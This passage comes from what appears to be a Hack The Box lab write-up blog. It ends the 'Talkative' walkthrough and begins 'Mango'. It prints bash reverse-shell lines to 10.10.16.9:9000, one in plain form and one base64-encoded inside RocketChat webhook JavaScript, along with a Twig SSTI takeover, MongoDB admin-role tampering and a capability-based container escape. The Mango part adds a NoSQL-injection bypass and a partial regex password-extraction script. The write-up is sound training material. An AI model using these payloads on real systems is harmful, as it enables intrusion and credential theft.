<p>A <strong>handy tool</strong> here would be <code class="language-plaintext highlighter-rouge">nmap</code>. we’re going to upload a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">standalone binary</a> for it to our container.</p>

<p><em>For the transfer,</em> we used the <strong>same bash tricks</strong> as earlier but <em>in the opposite direction</em> this time.</p>

<p><img src="/assets/Talkative/jamovi-container-transfer-nmap.jpg" alt="" /></p>

<p>we ran <strong>a quick network discovery</strong> with <code class="language-plaintext highlighter-rouge">-sn</code> and <strong>increased the rate</strong> with <code class="language-plaintext highlighter-rouge">--min-rate</code> and <code class="language-plaintext highlighter-rouge">-T4</code> for speed</p>

<p><img src="/assets/Talkative/jamovi-container-network-discovery.jpg" alt="" /></p>

<p>we <strong>only found</strong> the <code class="language-plaintext highlighter-rouge">172.18.0.1</code> host up.</p>

<p><em>next,</em> we ran a <strong>full port scan</strong> against it to detect any thing that <strong><em>wasn’t exposed from the outside (like that filtered SSH port maybe?)</em></strong>.</p>

<p><em>but to do that,</em> <code class="language-plaintext highlighter-rouge">nmap</code> needed a file called “<code class="language-plaintext highlighter-rouge">/etc/services</code>” which was missing.</p>

<p>that file <strong>was there on our Kali</strong>. so we got it and re-ran <code class="language-plaintext highlighter-rouge">nmap</code>.</p>

<p><img src="/assets/Talkative/jamovi-container-no-ssh-to-host.jpg" alt="" /></p>

<p>the <strong>SSH port was filtered from here as well</strong>. the effort was <strong><em>still worth it</em></strong> though :)</p>

<p>the <strong>remaining ports</strong> were <em>already exposed from outside</em>. so we moved on..</p>

<h3 id="check-2-attempting-to-escape-our-container">Check #2: Attempting to Escape our Container</h3>

<p><em>Because we had the</em> <code class="language-plaintext highlighter-rouge">root</code> <em>privilege</em>, it was <strong>also important</strong> to run a tool like <a href="https://github.com/stealthcopter/deepce">deepce.sh</a> to <strong>try and break out of our docker onto the host.</strong></p>

<p><img src="/assets/Talkative/jamovi-deepce-sh.jpg" alt="" /></p>

<p>The <strong>capability</strong> we found: <code class="language-plaintext highlighter-rouge">cap_dac_override</code> wasn’t dangerous on its own.</p>

<p>It required the <code class="language-plaintext highlighter-rouge">cap_dac_read_search</code> with it to <strong><em>enable a Docker escape.</em></strong></p>

<p><em>Having</em> <strong><em>checked the above paths</em></strong> <em>and found them closed,</em> we can now <strong><em>safely move on to Bolt without looking back :)</em></strong></p>

<h2 id="reusing-creds-on-bolt-and-exploiting-it-for-rce">Reusing Creds on Bolt and Exploiting it for RCE</h2>

<p><em>To find bolt’s login page,</em> we <strong>searched Google:</strong> “bolt admin login”.</p>

<p>we found the <a href="https://docs.boltcms.io/5.0/manual/login">Official Documentation Page</a></p>

<p><em>according to it,</em> the <code class="language-plaintext highlighter-rouge">/bolt</code> web directory <strong>contains the login page.</strong></p>

<p><img src="/assets/Talkative/bolt-login-page.jpg" alt="" /></p>

<p>Trying <strong>all the usernames</strong> and <strong>emails</strong> with <strong>all the passwords</strong> didn’t get us in.</p>

<p><em>However,</em> trying the <code class="language-plaintext highlighter-rouge">admin</code> username worked with <code class="language-plaintext highlighter-rouge">jeO09ufhWD&lt;s</code> (<code class="language-plaintext highlighter-rouge">matt</code><em>’s password</em>).</p>

<p><em>Looking around for ways to RCE,</em> we tried to <strong>upload a PHP reverse shell</strong> since Bolt ran it server-side.</p>

<p>But <strong>that file type wasn’t allowed.</strong></p>

<p><img src="/assets/Talkative/bolt-fail-to-upload-php.jpg" alt="" /></p>

<p>And <strong>editing the config file</strong> wasn’t an option either.</p>

<p><img src="/assets/Talkative/bolt-cant-edit-config-file.jpg" alt="" /></p>

<p><em>However, since the</em> <code class="language-plaintext highlighter-rouge">.twig</code> <em>file extension was allowed,</em> we had a chance to <strong>execute code</strong> using the same concept as <strong>Server-Side Template Injection (SSTI).</strong></p>

<p><em>because</em> <strong>Twig</strong> <em>is a</em> <strong>template engine for PHP</strong>, it essentially <strong>enables us to run server-side code.</strong></p>

<p><em>To proceed,</em> we went to <strong>“File Management”</strong> &gt; <strong>“View &amp; edit templates”</strong></p>

<p><img src="/assets/Talkative/bolt-view-edit-templates.jpg" alt="" /></p>

<p>We <strong>chose the “base-2021” theme</strong> -<em>since it was the one likely in use</em>- then selected <code class="language-plaintext highlighter-rouge">index.twig</code> for editing.</p>

<p><img src="/assets/Talkative/bolt-index-twig-writable.jpg" alt="" /></p>

<p><em>it looked writable,</em> so we next <strong>inserted a standard SSTI payload</strong> from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig">PayloadAllTheThings</a>’s Github Repo.</p>

<p><img src="/assets/Talkative/bolt-basic-ssti-payload.jpg" alt="" /></p>

<p><em>After saving,</em> this payload was <strong>expected to reflect</strong> on the home page.</p>

<p>But that <strong>change didn’t take effect</strong> until we <strong>“Cleared the Cache”</strong> from the option in the <strong>“Maintenance”</strong> menu.</p>

<p><img src="/assets/Talkative/bolt-clear-the-cache-feature.jpg" alt="" /></p>

<p>the <strong>number 49</strong> appeared at the <strong>top right corner</strong> of the page.</p>

<p><img src="/assets/Talkative/bolt-ssti-execution-confirmed.jpg" alt="" /></p>

<p><em>Having</em> <strong><em>confirmed code execution,</em></strong> we switched to a <strong>base64-encoded bash reverse shell</strong> payload:</p>

<p><img src="/assets/Talkative/bolt-ssti-bash-reverse-shell.jpg" alt="" /></p>

<p><strong>which is</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.16.9/9000 0&gt;&amp;1
</code></pre></div></div>

<p><em>with another cache clear and a visit to the home page,</em> we <strong>get back a shell</strong> as <code class="language-plaintext highlighter-rouge">www-data</code>. (<em>yes, we did mess up the home page, but you get the idea xD</em>)</p>

<p><img src="/assets/Talkative/bolt-ssti-shell-access.jpg" alt="" /></p>

<h2 id="enumerating-the-2nd-container-subnet-and-reaching-the-host">Enumerating the 2nd Container Subnet and Reaching the Host</h2>

<p><strong>Listing the contents of the system root</strong> showed us we were now in <strong>another Docker container</strong> but with a <strong>different IP</strong> of <code class="language-plaintext highlighter-rouge">172.17.0.13</code></p>

<p><img src="/assets/Talkative/bolt-docker-ip.jpg" alt="" /></p>

<p>This was a <strong>different subnet</strong> from the <strong>Jamovi</strong> container’s (<code class="language-plaintext highlighter-rouge">172.18.0.0/24</code>).</p>

<p><strong><em>to discover this area,</em></strong> we’re going to do <strong>the same thing as before:</strong> use <code class="language-plaintext highlighter-rouge">nmap</code></p>

<p><img src="/assets/Talkative/bolt-docker-getting-nmap.jpg" alt="" /></p>

<p><em>after transferring it,</em> we run <strong>a host discovery</strong> over the <code class="language-plaintext highlighter-rouge">172.17.0.0/24</code> subnet</p>

<p><img src="/assets/Talkative/bolt-docker-nmap-discovery.jpg" alt="" /></p>

<p>we found <strong>a LOT of live addresses</strong> there (<em>from</em> <code class="language-plaintext highlighter-rouge">172.17.0.1</code> <em>all the way up to</em> <code class="language-plaintext highlighter-rouge">172.17.0.19</code>)</p>

<p>we’ve been wanting to <strong>try the creds</strong> we found <strong>on the host’s SSH port</strong>. <em>But it was always filtered.</em></p>

<p><em>However, on this container,</em> we found the <strong>SSH client installed</strong> which was interesting and tried to <strong>connect to the host</strong>:</p>

<p><img src="/assets/Talkative/bolt-docker-try-ssh-to-host.jpg" alt="" /></p>

<p><em>After a couple of tries,</em> the <strong>set of creds</strong> that worked were <code class="language-plaintext highlighter-rouge">saul</code> and <code class="language-plaintext highlighter-rouge">jeO09ufhWD</code></p>

<p><img src="/assets/Talkative/ssh-as-saul.jpg" alt="" /></p>

<h2 id="finding-rocketchats-mongodb-instance-and-altering-it">Finding RocketChat’s MongoDB Instance and Altering it</h2>

<p><em>while inside, when trying to privesc,</em> we ran <a href="https://github.com/carlospolop/PEASS-ng">linpeas</a>. But we <strong>didn’t find a way</strong> to <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><em>but, when looking at</em> <strong>the system processes,</strong> we noticed <strong>plenty of docker instances</strong> running:</p>

<p><img src="/assets/Talkative/host-enumerating-docker-processes.jpg" alt="" /></p>

<ul>
  <li><strong>Most of the ports</strong> were 80.</li>
  <li>There was <strong>one for 3000</strong> which was <strong>probably RocketChat</strong>. A container we haven’t touched.</li>
  <li>There were <strong>other high ports</strong> that we wanted to check.</li>
</ul>

<p><strong><em>But to be sure we weren’t missing any other ports,</em></strong> we uploaded <code class="language-plaintext highlighter-rouge">nmap</code> a 3rd time and ran a <strong>full port scan</strong> over the entire <code class="language-plaintext highlighter-rouge">172.17.0.2-19</code> IP range.</p>

<p>And we <strong>did find something very interesting.</strong></p>

<p><img src="/assets/Talkative/host-mongo-db-discovered.jpg" alt="" /></p>

<p><strong>Port 27017</strong> is the <strong>default port for MongoDB</strong>. which is <em>-by default-</em> <strong>known for having no authentication</strong>.</p>

<p><em>to reach that port on the</em> <code class="language-plaintext highlighter-rouge">172.17.0.2</code> <em>host,</em> we will use <strong>some port forwarding magic.</strong></p>

<p><a href="https://github.com/jpillora/chisel">Chisel</a> is a <strong>nice choice</strong> for its <strong>ease-of-use</strong>.</p>

<p>we <strong>uploaded it</strong> and <strong>created a tunnel to Mongo.</strong></p>

<p><img src="/assets/Talkative/tunneling-and-reaching-mongodb.jpg" alt="" /></p>

<p><em>Having authenticated without any credentials,</em> we could <strong>enumerate the database</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># listing the databases</span>
show dbs
<span class="c"># using the meteor database</span>
use meteor
<span class="c"># showing collections within the meteor db (equivaled to tables in MySQL)</span>
show collections
</code></pre></div></div>

<p><em>among the various collections,</em> we found one called <strong>“users”</strong> which had interesting stuff:</p>

<p><img src="/assets/Talkative/saul-rockechat-user.jpg" alt="" /></p>

<p>we noticed <code class="language-plaintext highlighter-rouge">saul</code>’s account, which <strong>had an admin role.</strong></p>

<p><strong><em>Trying to compromise it,</em></strong> we:</p>
<ol>
  <li><strong>tried to login</strong> using the <strong>passwords we found earlier.</strong> none worked.</li>
  <li>we also tried <strong>cracking the bcrypt hash</strong>. but without any luck.</li>
  <li>we <strong>replaced that bcrypt hash</strong> with one of our own. <em>still, for some reason,</em> <strong>that change didn’t reflect.</strong></li>
  <li>we even <strong>used his ID and token as cookies</strong> in our browser to impersonate him. but, <strong>that also didn’t work</strong> :/</li>
</ol>

<p><img src="/assets/Talkative/using-saul-cookies-for-impersonation.jpg" alt="" /></p>

<p><strong><em>so, instead,</em></strong> we chose to <strong>update our user’s role</strong> in the database to <strong>grant him admin privileges :D</strong></p>

<p>we ran the <strong>NoSQL update statement</strong> below to carry this out.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nx">update</span><span class="p">({</span> <span class="na">_id</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">voBu5qYu5ye3vDcw7</span><span class="dl">"</span><span class="p">},</span> <span class="p">{</span>
	<span class="na">$set</span><span class="p">:</span> <span class="p">{</span> 
		<span class="na">roles</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">]</span>
	<span class="p">}</span>
<span class="p">})</span>
</code></pre></div></div>

<p>it <strong>ran without problems</strong>.</p>

<p><img src="/assets/Talkative/mongo-grant-admin-role.jpg" alt="" /></p>

<p>we confirmed this with another query.</p>

<p><img src="/assets/Talkative/mongo-admin-role-granted.jpg" alt="" /></p>

<p><em>after relogging,</em> we could now <strong>access RocketChat’s administrator interface</strong> at <code class="language-plaintext highlighter-rouge">/admin</code></p>

<p><img src="/assets/Talkative/rocket-chat-logged-in-as-admin.jpg" alt="" /></p>

<p><em>Noticing the version,</em> we <strong>searched for exploits</strong> but <em>didn’t get any results.</em></p>

<h2 id="abusing-rocketchat-integrations-for-rce">Abusing RocketChat Integrations for RCE</h2>
<p><em>While searching</em> <strong><em>Google</em></strong> <em>for ways to</em> <strong><em>execute code using RocketChat’s admin,</em></strong> we <strong>intially expected an article or something</strong> but we <strong>came across exploits</strong> instead.</p>

<p><img src="/assets/Talkative/rocket-chat-search-admin-rce.jpg" alt="" /></p>

<p><em>Checking the one on</em> <a href="https://www.exploit-db.com/exploits/50108">Exploit-DB</a>, We <strong>looked closely</strong> at the <code class="language-plaintext highlighter-rouge">rce</code> <strong>function</strong> within the <strong>Python code.</strong></p>

<p>it seemed that <strong>RochetChat’s Integration feature</strong> was <strong>being abused</strong> to <strong>run Javascript code server-side</strong>. This is how <strong>Remote Code Execution</strong> was obtained.</p>

<p><img src="/assets/Talkative/rocket-chat-rce-exploit-analysis.jpg" alt="" /></p>

<p><em>following the</em> <strong><em>exploit’s way of creating its payload,</em></strong> we <strong>created our own Integration</strong> and <strong>Incoming Web Hook</strong> to <strong>execute a bash reverse shell</strong> instead of the <code class="language-plaintext highlighter-rouge">cmd</code> variable above.</p>

<p><strong>Here’s the code:</strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">require</span> <span class="o">=</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="kd">constructor</span><span class="p">(</span><span class="dl">'</span><span class="s1">return process.mainModule.require</span><span class="dl">'</span><span class="p">)();</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ== | base64 -d | bash</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="/assets/Talkative/rocket-chat-incoming-webhook-setup.jpg" alt="" /></p>

<p><em>After</em> <strong><em>filling out all the fields</em></strong> <em>similar to the exploit,</em> we <strong>saved the changes.</strong></p>

<p>we then <strong>copied</strong> the <code class="language-plaintext highlighter-rouge">curl</code> command</p>

<p><img src="/assets/Talkative/rocket-chat-obtaining-the-webhook-url.jpg" alt="" /></p>

<p>and used it to <strong>trigger the webhook</strong> after starting our <code class="language-plaintext highlighter-rouge">ncat</code> listener in advance.</p>

<p><img src="/assets/Talkative/rocket-chat-curling-the-webhook-url.jpg" alt="" /></p>

<p>we got a <strong>sweet</strong> <code class="language-plaintext highlighter-rouge">root</code> <strong>shell</strong> on the <strong>RocketChat container :D</strong></p>

<h2 id="escaping-and-owning-the-host-finally">Escaping and Owning the Host (Finally)</h2>
<p><em>Right after getting in,</em> we <strong>improved our shell</strong> using the <code class="language-plaintext highlighter-rouge">script</code> utility to <strong>get a pty.</strong></p>

<p><img src="/assets/Talkative/rocket-chat-container-improving-the-shell.jpg" alt="" /></p>

<p>we then <strong>transfered</strong> the <code class="language-plaintext highlighter-rouge">deepce.sh</code> script and <strong>ran it</strong> to <strong>check for ways to escape to the host.</strong></p>

<p><em>because the</em> <code class="language-plaintext highlighter-rouge">capsh</code> <em>tool wasn’t installed,</em> the script <strong>couldn’t enumerate the docker’s capabilities.</strong></p>

<p><img src="/assets/Talkative/rocket-container-no-capsh-installed.jpg" alt="" /></p>

<p><em>since</em> <strong><em>capabilities are one of the main ways to escape containers,</em></strong> we <strong>had to install the missing items.</strong></p>

<p>we <code class="language-plaintext highlighter-rouge">cat</code> the <code class="language-plaintext highlighter-rouge">/etc/os-release</code> file to <strong>get our Linux distro.</strong></p>

<p><img src="/assets/Talkative/rocket-container-linux-distro.jpg" alt="" /></p>

<p>we were on <strong>Debian 10.</strong> so we searched <strong>Google</strong> to find out how to install <code class="language-plaintext highlighter-rouge">capsh</code></p>

<p>The <strong>first result</strong> was from a website called <a href="https://command-not-found.com/capsh">command-not-found.com</a>. <strong><em>a suitable name :)</em></strong></p>

<p><img src="/assets/Talkative/rocket-container-finding-capsh-dependencies-1.jpg" alt="" /></p>

<p><em>according to it,</em> we needed the <code class="language-plaintext highlighter-rouge">libcap2-bin</code> library.</p>

<p>we <strong>could obtain it</strong> from the <a href="https://packages.debian.org/sid/amd64/libcap2-bin/download">Debain packages</a> site</p>

<p><em>but during installation,</em> it <strong>required another library</strong>: <code class="language-plaintext highlighter-rouge">libcap2</code></p>

<p><img src="/assets/Talkative/rocket-container-finding-capsh-dependencies-2.jpg" alt="" /></p>

<p>we got it the same way from <a href="https://packages.debian.org/sid/amd64/libcap2/download">here</a> and installed it using <code class="language-plaintext highlighter-rouge">dpkg -i</code></p>

<p><strong><em>having installed the required dependencies,</em></strong> we ran <code class="language-plaintext highlighter-rouge">deepce.sh</code> a second time:</p>

<p><img src="/assets/Talkative/rocket-chat-container-capabilities-discovered.jpg" alt="" /></p>

<p>we found a <strong>set of critical capabilities</strong>. Namely <code class="language-plaintext highlighter-rouge">cap_dac_read_search</code> and <code class="language-plaintext highlighter-rouge">cap_dac_override</code> which <strong>together can be exploited to write files to the host machine.</strong></p>

<p>We’re going to <strong>follow the method explained</strong> in the <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override">HackTricks</a> page and <strong>compile the C code.</strong></p>

<p><strong>Note:</strong> <strong><em>staticly linking the binary</em></strong> with the <code class="language-plaintext highlighter-rouge">-static</code> flag will <strong>make sure it has the libraries</strong> it needs.</p>

<p><img src="/assets/Talkative/privesc-compile-shocker-write.jpg" alt="" /></p>

<p>the <strong>warning wasn’t a concern</strong> here. we still <strong>got the compiled executable</strong> despite it.</p>

<p><em>To compromise the host,</em> we first <strong>generated an SSH key pair.</strong></p>

<p><img src="/assets/Talkative/privesc-generating-ssh-key-pair.jpg" alt="" /></p>

<p>we then <strong>transferred the public key</strong> and <strong>used the exploit</strong> to <strong>write it over</strong> the host’s <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> file.</p>

<p><img src="/assets/Talkative/privesc-writing-ssh-public-key-to-host.jpg" alt="" /></p>

<p><strong>which was a success!</strong></p>

<p>The <strong>final step</strong> was to <strong>transfer the private key to the bolt container</strong> (<em>since it had the</em> <code class="language-plaintext highlighter-rouge">ssh</code> <em>client installed</em>) and use it to <strong>own the box.</strong></p>

<p><img src="/assets/Talkative/privesc-rooted-finally.jpg" alt="" /></p>

<p><strong>What a trip! :D</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Medium] - Mango</title><link href="http://localhost:4000/2022/10/11/Mango.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Medium] - Mango" /><published>2022-10-11T00:00:00+02:00</published><updated>2022-10-11T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/11/Mango</id><content type="html" xml:base="http://localhost:4000/2022/10/11/Mango.html"><![CDATA[<p><img src="/assets/Mango/Mango.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>Mango</strong> is a <strong>Linux box</strong> where both <strong>HTTP and HTTPS websites</strong> are hosted.</li>
  <li><em>While inspecting the site’s</em> <strong><em>SSL certificate</em></strong>, we notice another <strong>virtual host.</strong></li>
  <li>That <strong>vhost</strong> had a <strong>login page</strong> on HTTP which happened to <strong>vulnerable to NoSQL injection.</strong></li>
  <li><em>After logging in with an</em> <strong><em>Authentication Bypass,</em></strong> we found the site <strong><em>still under construction.</em></strong></li>
  <li><em>Without any functionality to abuse,</em> we turned to <strong>NoSQL’s built-in regex capability</strong> to <strong>enumerate the usernames and passwords</strong> on the web app <strong><em>in hopes of reusing them with SSH.</em></strong></li>
  <li><em>Since</em> <strong><em>retrieving passwords manually</em></strong> <em>was time consuming,</em> we <strong>wrote a Python script</strong> to <strong>automate the process</strong> and <strong>further developed it</strong> for <strong>multi-threading support</strong> <strong><em>(it ran 9X faster.)</em></strong></li>
  <li>We were able to get <strong>credentials for two usernames</strong>: <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">mango</code>. The <code class="language-plaintext highlighter-rouge">mango</code> user had <strong>SSH access</strong> which we leveraged to access the box.</li>
  <li><em>From inside,</em> we could <strong>pivot</strong> to the <code class="language-plaintext highlighter-rouge">admin</code> user using <code class="language-plaintext highlighter-rouge">su</code> because <strong><em>had the same password.</em></strong></li>
  <li><em>While trying to</em> <strong><em>escalate our privileges</em></strong>, we found an <strong>SUID binary</strong> called <code class="language-plaintext highlighter-rouge">jjs</code> which we <strong>exploited</strong> with the help of <a href="https://gtfobins.github.io/">GTFOBins</a> <em>-and some minor tweaks-</em> to become <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_http-server-header: Apache/2.4.29 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
</code></pre></div></div>
<p><em>From the</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>port scan,</em> we see <strong>SSH, HTTP &amp; HTTPS</strong> ports open.</p>

<p>But we also notice that the <code class="language-plaintext highlighter-rouge">ssl-cert</code> script shows a <strong>virtual host</strong>: <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code></p>

<h2 id="checking-the-websites">Checking the Websites</h2>
<p><em>To handle</em> <strong><em>Virtual Host Routing,</em></strong> We <strong>add an entry</strong> in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file for both the <strong>TLD</strong> <code class="language-plaintext highlighter-rouge">mango.htb</code> and the <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code> <strong>subdomain</strong>.</p>

<p><img src="/assets/Mango/etc-hosts.jpg" alt="" /></p>

<p>visting <code class="language-plaintext highlighter-rouge">mango.htb</code> only gets us a <strong>valid page</strong> on the <strong>HTTPS site</strong>. The <strong>HTTP</strong> one gives back a <strong>403 forbidden response</strong> <em>as we’ve seen from</em> <code class="language-plaintext highlighter-rouge">nmap</code><em>’s output.</em></p>

<p><img src="/assets/Mango/mango-htb-sites.jpg" alt="" /></p>

<p>The <strong>search function</strong> suggests testing for <strong>SQL Injection</strong>. <em>To do so,</em> we <strong>intercept the request</strong> and <strong>save it to a file.</strong></p>

<p><img src="/assets/Mango/search-sqli-request.jpg" alt="" /></p>

<p>then pass it to <code class="language-plaintext highlighter-rouge">sqlmap</code> using the <code class="language-plaintext highlighter-rouge">-r</code> flag as well as the <code class="language-plaintext highlighter-rouge">--force-ssl</code> flag to <strong>target HTTPS.</strong></p>

<p><img src="/assets/Mango/sqlmap-search.jpg" alt="" /></p>

<p>Doing this <strong><em>doesn’t yield back any results :/</em></strong></p>

<p><em>Afterward,</em> we attempted to <strong>abuse any of the available functions</strong> in the <code class="language-plaintext highlighter-rouge">analytics.php</code> page. (<strong><em>like checking for SSRF</em></strong>)</p>

<p><img src="/assets/Mango/analytics-page-testing.jpg" alt="" /></p>

<p><em>but without no luck there as well.</em></p>

<p><em>Moving on, we look at the</em> <strong>HTTP version</strong> <em>of the</em> <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code> <em>virtual host,</em> we found a <strong>login page.</strong></p>

<p><img src="/assets/Mango/http-subdomain.jpg" alt="" /></p>

<p><em>After intercepting the request,</em> we attempted injecting <strong>common SQL Injection payloads</strong> but they <em>didn’t work.</em></p>

<p><em>So intead,</em> we tried <strong>NoSQL methods for bypassing authentication</strong> like using the not equal (<code class="language-plaintext highlighter-rouge">$ne</code>) directive.</p>

<p><em>By setting</em> <strong><em>both the username and password</em></strong> <em>to</em> <strong><em>values we’re sure don’t exist in the database</em></strong> <em>(ex: test/test),</em> the check <strong>should evaluate to</strong> <code class="language-plaintext highlighter-rouge">true</code> and let us log in.</p>

<p><img src="/assets/Mango/nosqli-auth-bypass.jpg" alt="" /></p>

<p><strong>It worked!</strong> and we got a <strong>302 response.</strong> we <strong>followed the redirection</strong> to get this page:</p>

<p><img src="/assets/Mango/login-success-page.jpg" alt="" /></p>

<p>we get a <strong>potential username</strong> here: <code class="language-plaintext highlighter-rouge">admin</code></p>

<p><em>other than that,</em> there was <strong>nothing here to played with.</strong></p>

<h2 id="exploiting-nosql-injection-to-get-credentials">Exploiting NoSQL Injection to Get Credentials</h2>

<p><strong><em>Still,</em></strong> having a <strong>NoSQL Injection</strong> means we can <strong><em>abuse</em></strong> the <code class="language-plaintext highlighter-rouge">$regex</code> directive to <strong>enumerate any usernames/passwords.</strong></p>

<p>Our plan here is to <strong>obtain creds</strong> and <strong>try them with SSH</strong> to <strong>exploit any reuse.</strong></p>

<p><em>To check the</em> <strong><em>first character</em></strong> <em>of the</em> <code class="language-plaintext highlighter-rouge">admin</code> <em>user’s password,</em> we can <strong>supply a regular expression</strong> like below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=admin&amp;password[$regex]=^a
</code></pre></div></div>

<p>The above regex would <strong><em>be evaluated</em></strong> to see if the <strong>password starts</strong> with the letter “a” or not.</p>

<ul>
  <li><strong><em>if the pattern matches,</em></strong> we would get the <strong>302 redirect</strong> and <strong>get authenticated.</strong></li>
  <li><strong><em>if not,</em></strong> we should get a <strong><em>different response.</em></strong></li>
</ul>

<p>Let’s <strong>give it a try</strong> using <strong>Burp</strong></p>

<p><img src="/assets/Mango/nosql-enum-incorrect-first-letter.jpg" alt="" /></p>

<p>we get a <strong>200 OK</strong>. this means that <strong>the password doesn’t start with the letter “a”.</strong></p>

<p><strong><em>But, when trying different letters…</em></strong></p>

<p><img src="/assets/Mango/nosql-enum-correct-first-letter.jpg" alt="" /></p>

<p>the response is a <strong>302 redirect</strong> when we <strong>put the first letter as “t”</strong>. which means it’s <strong>the first character</strong> of the <code class="language-plaintext highlighter-rouge">admin</code> user’s password.</p>

<p>Doing this process <strong><em>manually</em></strong> can take a lot of time. That’s <strong>especially true with passwords</strong> since we have to <strong>test all uppercase/lowercase letters in addition to all digits and symbols.</strong></p>

<p><em>That’s why,</em> we <strong>wrote a Python script</strong> to <strong><em>automate the process</em></strong> and <strong><em>even used multi-threading</em></strong> to <strong>make it go faster</strong>.</p>

<p><strong>Note:</strong></p>
<ul>
  <li><em>For brevity,</em> the code below is <strong>mainly for obtaining passwords</strong>. But the <strong><em>same concept applies to enumerating usernames (the code for that is commented out).</em></strong></li>
  <li>I <strong>put comments</strong> to <strong>explain the script</strong> at every point. you’re <strong>advised to read those</strong> to <strong>figure out the logic.</strong></li>
  <li><em>Lastly,</em> I <strong>divided the script</strong> into <strong>three parts</strong> to <strong>make it easier to grasp.</strong></li>
</ul>

<h3 id="the-1st-part-importing-the-required-libraries-and-the-test-function">The 1st Part: Importing the required libraries and the “test” function</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
<span class="kn">import</span> <span class="nn">string</span> <span class="c1"># includes the needed character sets
</span><span class="kn">import</span> <span class="nn">requests</span>

<span class="c1"># a function that takes in a character as input and tests if the password starts with it or not
</span><span class="k">def</span> <span class="nf">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
	<span class="c1"># the password variable is defined globally to be accessible everywhere and to be populated
</span>	<span class="k">global</span> <span class="n">password</span>
	<span class="c1"># the regex payload, notice that we keep appending the character in question to the end of the already discovered part of the password
</span>	<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"^</span><span class="si">{</span><span class="n">password</span><span class="si">}{</span><span class="n">character</span><span class="si">}</span><span class="s">"</span>
	<span class="n">url</span> <span class="o">=</span> <span class="s">'http://staging-order.mango.htb/'</span>
	<span class="c1"># filling out the post data with the supplied username and character
</span>	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">'username'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
		<span class="s">'password[$regex]'</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
		<span class="s">'login'</span><span class="p">:</span> <span class="s">'login'</span>
	<span class="p">}</span>
	<span class="s">"""
	# here's the post data if you want to enumerate usernames
	data = {
		'username[$regex]': payload,
		'password[$ne]': '',
		'login': 'login'
	}
	"""</span>
	<span class="c1"># special print function for a cool effect
